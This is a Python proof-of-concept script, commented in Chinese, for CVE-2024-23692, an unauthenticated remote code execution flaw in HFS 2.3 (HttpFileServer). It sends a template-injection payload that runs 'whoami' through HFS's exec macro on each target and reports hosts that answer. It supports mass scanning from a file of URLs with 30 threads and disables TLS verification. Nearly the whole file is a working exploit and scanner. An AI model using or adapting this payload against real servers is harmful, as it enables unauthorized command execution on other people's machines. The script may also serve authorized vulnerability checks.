"""
介绍：HFS2.3未经身份验证的远程代码执行(CVE-2024-23692)
指纹："HttpFileServer"
"""
import argparse
import textwrap
from multiprocessing.dummy import Pool

import requests
from urllib3.exceptions import InsecureRequestWarning


def check(target, timeout=5):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/94.0.4606.81 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'close',
        }
        url = target + '/?n=%0A&cmd=whoami&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{' \
                       '.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}'

        # 抑制 InsecureRequestWarning 警告
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        response = requests.get(url, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200 and 'RESULT' in response.text:
            print('[*]存在漏洞' + url)
        else:
            print('[-]不存在漏洞' + target)
    except TimeoutError:
        print(f"请求超时{target}")
    except Exception as e:
        print(f"连接失败{target}-无法建立连接")


def main():
    banner = """
                ) (`-.            ) (`-.              
         ( OO ).           ( OO ).            
        (_/.  \_)-. ,-.-')(_/.  \_)-. ,-.-')  
         \  `.'  /  |  |OO)\  `.'  /  |  |OO) 
          \     /\  |  |  \ \     /\  |  |  \ 
           \   \ |  |  |(_/  \   \ |  |  |(_/ 
          .'    \_),|  |_.' .'    \_),|  |_.' 
         /  .'.  \(_|  |   /  .'.  \(_|  |    
        '--'   '--' `--'  '--'   '--' `--'    

        """
    print(banner)
    parse = argparse.ArgumentParser(description="HFS2.3未经身份验证的远程代码执行(CVE-2024-23692)", formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''example:
    python3 HFS2.3_poc.py -u http://xxxx.xxxx.xxxx.xxxx
    python3 HFS2.3_poc.py -f x_url.txt '''))
    parse.add_argument('-u', '--url', dest='url', type=str, help='添加url信息')
    parse.add_argument('-f', '--file', dest='file', type=str, help='添加txt文件')

    args = parse.parse_args()
    targets = []
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    url = f"http://{target}"
                    targets.append(url)
            pool.map(check, targets)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
